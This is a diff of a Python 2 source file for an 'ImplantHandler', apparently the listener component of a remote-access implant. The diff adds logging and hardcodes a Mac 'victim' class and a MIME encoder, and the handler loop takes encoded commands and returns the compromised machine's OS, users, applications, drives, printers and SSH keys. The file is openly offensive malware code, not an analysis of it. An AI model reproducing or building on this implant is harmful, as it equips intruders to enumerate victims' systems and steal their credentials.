@@ -1,3 +1,4 @@
+import logging
 import os
 import platform
 import SocketServer
@@ -5,60 +6,52 @@ import sys
 
 from os_types.macintosh import Mac
 from os_types.windows import Windows
-    
+from encoders.mime import Mime
+
+logging.basicConfig(level=logging.DEBUG, format='%(name)s: %(message)s')
+
 class ImplantHandler(SocketServer.BaseRequestHandler):
-    def __init__(self, ip, port, cipher):
-        self.ip = ip
-        self.port = port
-        self.cipher = cipher
-        #self.logger = logging.getLogger('ImplantHandler')
-        
+    def __init__(self, request, client_address, server):
+        self.logger = logging.getLogger('ImplantHandler')
+        self.logger.debug('__init__')
+        SocketServer.BaseRequestHandler.__init__(self, request, client_address, server)
+        return
+    
+    def setup(self):
+        self.logger.debug('setup')
+        return SocketServer.BaseRequestHandler.setup(self)
+
     def handle(self):
-        from .constants import BUFFER_SIZE
-        print "here1"
-        if platform.system() == 'Darwin':
-            victim = Mac()
-        elif platform.system() == 'Windows': #if sys.platform.lower().startswith("win"):
-            victim = Windows()
-        else:
-            self.request.sendall("Unknown OS: " + platform.system + ". Please proceed with caution.")
-
+        from constants import BUFFER_SIZE
+        self.logger.debug('handle')
+        
+        victim = Mac()
+        cipher = Mime()
+        
         while True:
-            print "here2"
             try:
-                cmd = self.cipher.decode(self.request.recv(BUFFER_SIZE)).strip()
-
+                cmd = cipher.decode(self.request.recv(BUFFER_SIZE)).strip()
+                 
                 if cmd == "enum_os":
-                    self.request.sendall(self.cipher.encode(victim.enum_os()))
+                    self.request.sendall(cipher.encode(victim.enum_os()))
                 elif cmd == "enum_users":
-                    self.request.sendall(self.cipher.encode(victim.enum_users()))
+                    self.request.sendall(cipher.encode(victim.enum_users()))
                 elif cmd == "enum_applications":
-                    self.request.sendall(self.cipher.encode(victim.enum_applications()))
+                    self.request.sendall(cipher.encode(victim.enum_applications()))
                 elif cmd == "enum_drives":
-                    self.request.sendall(self.cipher.encode(victim.enum_drives()))
+                    self.request.sendall(cipher.encode(victim.enum_drives()))
                 elif cmd == "enum_printers":
-                    self.request.sendall(self.cipher.encode(victim.enum_printers()))
+                    self.request.sendall(cipher.encode(victim.enum_printers()))
                 elif cmd == "get_ssh_keys":
-                    self.request.sendall(self.cipher.encode(victim.get_ssh_keys()))
-                else:
-                    self.request.sendall(self.cipher.encode("unknown command\n"))
-            except Exception as e: 
-                print 'Uh no!', e
-                self.server.close_request(self.request)
-                sys.exit(1)                          
+                    self.request.sendall(cipher.encode(victim.get_ssh_keys()))
+            except: 
+                self.server.close_request(self.request) #remove this?
+                sys.exit(1)
+        return
 
-    def run(self):
-        try:
-            SocketServer.TCPServer.allow_reuse_address = True
-            server = SocketServer.TCPServer((self.ip, self.port), ImplantHandler)
-            print "[+] Implant active...Terminate w/ Ctrl-C\n"
-            server.serve_forever()
-        except KeyboardInterrupt:
-            server.shutdown()
-        except Exception as e:
-            print "[!] Implant run() --> {0}".format(e)
-        finally:
-            server.shutdown()
+    def finish(self):
+        self.logger.debug('finish')
+        return SocketServer.BaseRequestHandler.finish(self)
 
 # import os
 # import platform
